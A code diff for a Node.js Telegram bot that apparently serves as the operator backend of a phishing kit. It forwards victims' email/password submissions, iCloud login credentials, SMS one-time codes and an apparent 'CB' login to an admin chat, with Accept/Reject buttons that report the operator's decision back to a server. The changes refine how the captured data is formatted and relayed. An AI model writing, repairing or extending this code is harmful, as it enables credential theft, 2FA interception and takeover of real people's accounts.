@@ -45,7 +45,7 @@ let pendingRequests = {};
 const handledCallbacks = new Set();
 
 // -----------------
-// Email/Password approval
+// Email/Password approval (unchanged)
 // -----------------
 function sendApprovalRequest(email, password) {
   const options = {
@@ -66,7 +66,7 @@ function sendApprovalRequest(email, password) {
 }
 
 // -----------------
-// Generic code approval
+// Generic code approval (unchanged)
 // -----------------
 function sendApprovalRequestGeneric(identifier) {
   const options = {
@@ -87,10 +87,12 @@ function sendApprovalRequestGeneric(identifier) {
 }
 
 // -----------------
-// SMS code approval
+// ✅ FIXED: iCloud SMS approval
+// Now accepts full formatted message built by frontend
 // -----------------
-function sendApprovalRequestSMS(code) {
+async function sendApprovalRequestSMS(code, message) {
   const options = {
+    parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
         [
@@ -100,18 +102,16 @@ function sendApprovalRequestSMS(code) {
       ]
     }
   };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*SMS Approval Requested*\n*Code:* ${code}`,
-    { ...options, parse_mode: "Markdown" }
-  );
+  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
 
 // -----------------
-// iCloud Login approval
+// ✅ FIXED: iCloud Login approval
+// Now accepts full formatted message built by frontend
 // -----------------
-function sendApprovalRequestPage(email, password) {
+async function sendApprovalRequestPage(email, password, message) {
   const options = {
+    parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
         [
@@ -121,19 +121,16 @@ function sendApprovalRequestPage(email, password) {
       ]
     }
   };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*iCloud Login Approval Requested*\n*Email:* ${email}`,
-    { ...options, parse_mode: "Markdown" }
-  );
+  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
 
 // -----------------
-// CB Login approval
+// ✅ FIXED: CB Login approval
+// Now accepts full formatted message built by frontend
 // -----------------
-async function sendLoginTelegram(email) {
+async function sendLoginTelegram(email, message) {
   const options = {
-    parse_mode: "Markdown",
+    parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
         [
@@ -146,8 +143,6 @@ async function sendLoginTelegram(email) {
       ]
     }
   };
-
-  const message = `📧 *Email:* ${email}`;
   await bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
 
@@ -165,7 +160,7 @@ function send2FACode(code, chatId) {
 }
 
 // -----------------
-// Handle plain text messages (2FA keyboard Accept/Reject)
+// Handle plain text messages (keyboard Accept/Reject)
 // -----------------
 bot.on("message", (msg) => {
   const chatId = msg.chat.id;
@@ -188,7 +183,6 @@ bot.on("callback_query", async (query) => {
   // Ignore if already handled (prevents duplicates from polling restarts)
   if (handledCallbacks.has(query.id)) return;
   handledCallbacks.add(query.id);
-  // Clean up old entries after 1 minute to avoid memory leak
   setTimeout(() => handledCallbacks.delete(query.id), 60000);
 
   try {
@@ -206,7 +200,7 @@ bot.on("callback_query", async (query) => {
         body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
       });
 
-      // Step 1: Remove buttons from original message (keep info visible)
+      // Remove buttons from original message (keep info visible)
       try {
         await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
@@ -217,14 +211,13 @@ bot.on("callback_query", async (query) => {
         );
       } catch (_) {}
 
-      // Step 2: Send status as a new reply below the original message
-      // Extract the SMS code from the original Telegram message text
+      // Send status as a new message below
       const msgText = query.message.text || "";
       const smsMatch = msgText.match(/SMS[:\s]+([\d\s\-]+)/i);
       const displayCode = smsMatch ? smsMatch[1].trim() : null;
 
       const twoFaStatusText = displayCode
-        ? `💬 <code>${displayCode}</code> has been <b>${twoFaStatus.toUpperCase() === "APPROVED" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
+        ? `💬 <code>${displayCode}</code> has been <b>${twoFaStatus === "approved" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
         : `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`;
 
       await bot.sendMessage(
@@ -253,12 +246,12 @@ bot.on("callback_query", async (query) => {
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
-    // Step 1: Delete the original message entirely (no unnecessary leftover)
+    // Delete original message
     try {
       await bot.deleteMessage(query.message.chat.id, query.message.message_id);
     } catch (_) {}
 
-    // Step 2: Send standalone status message — SMS (all digits) vs Email
+    // Send standalone status message
     const isSMS = /^\d+$/.test(identifier);
     const replyText = isSMS
       ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
